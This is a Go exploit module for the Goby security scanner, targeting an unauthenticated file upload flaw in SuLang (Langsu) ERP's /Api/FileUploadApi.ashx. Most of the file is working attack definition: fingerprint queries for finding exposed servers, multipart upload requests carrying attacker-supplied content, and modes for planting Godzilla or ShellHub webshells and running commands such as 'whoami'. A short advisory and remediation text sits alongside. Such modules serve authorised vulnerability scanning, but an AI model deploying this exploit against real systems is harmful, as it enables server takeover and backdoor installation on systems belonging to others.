package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "SuLang ERP /Api/FileUploadApi.ashx File Upload Vulnerability",
    "Description": "<p>Langsu ERP is a powerful enterprise resource planning (ERP) software tailored for small and medium-sized enterprises, designed to help optimize management processes and improve operational efficiency. It is not only suitable for manufacturing but also widely applicable to retail, logistics, services, and other industries. For example, in manufacturing, it improves production efficiency and reduces production costs through functions such as production planning and material requirements planning; in retail, it increases inventory turnover and sales efficiency through inventory management and sales management functions; in logistics, it enhances logistics operations efficiency and service quality through transportation management and warehouse management functions; in services, it improves service quality and customer satisfaction through customer relationship management and project management functions. The FileUploadApi.ashx interface of Langsu ERP has a file upload vulnerability, allowing unauthenticated attackers to execute arbitrary code on the server, write backdoors, gain server permissions, and ultimately control the entire web server.</p>",
    "Product": "SuLang-ERP",
    "Homepage": "https://www.lserp.com",
    "DisclosureDate": "2024-06-26",
    "PostTime": "2024-12-30",
    "Author": "yanyongju@baimaohui.net",
    "FofaQuery": "(body=\"/Resource/Scripts/Yw/Yw_Bootstrap.js\" && body=\"rel=\\\"preload\\\"\" ) || body=\"/lserp_v8/index.html\"",
    "GobyQuery": "(body=\"/Resource/Scripts/Yw/Yw_Bootstrap.js\" && body=\"rel=\\\"preload\\\"\" ) || body=\"/lserp_v8/index.html\"",
    "Level": "2",
    "Impact": "<p>Unauthenticated attackers can exploit this vulnerability to execute arbitrary code on the server, write backdoors, gain server permissions, and ultimately control the entire web server.</p>",
    "Recommendation": "<p>1. Disable exposed interfaces on the Internet or set access permissions for the interfaces.2. Upgrade to a secure version.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144752846"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "ShellHub,Godzilla,Command,Customize",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "whoami",
            "show": "Mode=Command"
        },
        {
            "name": "Content",
            "type": "input",
            "value": "input your content",
            "show": "Mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/Api/FileUploadApi.ashx?method=DoWebUpload",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj",
                    "Accept": "*/*",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryFfJZ4PlAZBixjELj\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{{FILENAME}}}\"\r\nContent-Type: image/jpeg\r\n\r\n{{{CONTENT}}}\r\n------WebKitFormBoundaryFfJZ4PlAZBixjELj--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "WebRelPath",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "FILE_PATH|lastbody|regex|\"WebRelPath\":\\s*\"([^\"]+)\""
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/Api/FileUploadApi.ashx?method=DoWebUpload",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj",
                    "Accept": "*/*",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryFfJZ4PlAZBixjELj\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{{FILENAME}}}\"\r\nContent-Type: image/jpeg\r\n\r\n{{{CONTENT}}}\r\n------WebKitFormBoundaryFfJZ4PlAZBixjELj--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "filePath2|lastbody|regex|\"WebRelPath\":\\s*\"([^\"]+)\""
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "{{{filePath2}}}",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj",
                    "Accept": "*/*",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "WebRelPath",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.6",
    "Translation": {
        "CN": {
            "Name": "朗速ERP /Api/FileUploadApi.ashx 文件上传漏洞",
            "Product": "朗速ERP",
            "Description": "<p>朗速ERP是一款功能强大的企业资源计划（ERP）软件，专为中小企业量身打造，旨在帮助企业优化管理流程、提升运营效率。不仅适用于制造业，还广泛适用于零售、物流、服务等多个行业。例如，在制造业中，通过生产计划、物料需求计划等功能，提升生产效率和降低生产成本；在零售业中，通过库存管理、销售管理等功能，提高库存周转率和销售效率；在物流业中，通过运输管理、仓储管理等功能，提升物流运作效率和服务质量；在服务业中，通过客户关系管理、项目管理等功能，提升服务质量和客户满意度。朗速ERP FileUploadApi.ashx 接口存在文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "Recommendation": "<p>1. 关闭互联网暴露面或接口设置访问权限。2. 升级至安全版本。</p>",
            "Impact": "<p>未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "SuLang ERP /Api/FileUploadApi.ashx File Upload Vulnerability",
            "Product": "SuLang-ERP",
            "Description": "<p>Langsu ERP is a powerful enterprise resource planning (ERP) software tailored for small and medium-sized enterprises, designed to help optimize management processes and improve operational efficiency. It is not only suitable for manufacturing but also widely applicable to retail, logistics, services, and other industries. For example, in manufacturing, it improves production efficiency and reduces production costs through functions such as production planning and material requirements planning; in retail, it increases inventory turnover and sales efficiency through inventory management and sales management functions; in logistics, it enhances logistics operations efficiency and service quality through transportation management and warehouse management functions; in services, it improves service quality and customer satisfaction through customer relationship management and project management functions. The FileUploadApi.ashx interface of Langsu ERP has a file upload vulnerability, allowing unauthenticated attackers to execute arbitrary code on the server, write backdoors, gain server permissions, and ultimately control the entire web server.</p>",
            "Recommendation": "<p>1. Disable exposed interfaces on the Internet or set access permissions for the interfaces.2. Upgrade to a secure version.</p>",
            "Impact": "<p>Unauthenticated attackers can exploit this vulnerability to execute arbitrary code on the server, write backdoors, gain server permissions, and ultimately control the entire web server.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|FileUpload",
        "SCRIPT_TYPE": "define|variable|aspx",
        "VUL_URL": "define|variable|/Api/FileUploadApi.ashx?method=DoWebUpload",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/Api/FileUploadApi.ashx"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "SCRIPT_TYPE",
        "VUL_URL",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9981"
}`
  
    ExpManager.AddExploit(NewExploit(
      goutils.GetFileName(),
      expJson,
      nil,
      nil,
    ))
  }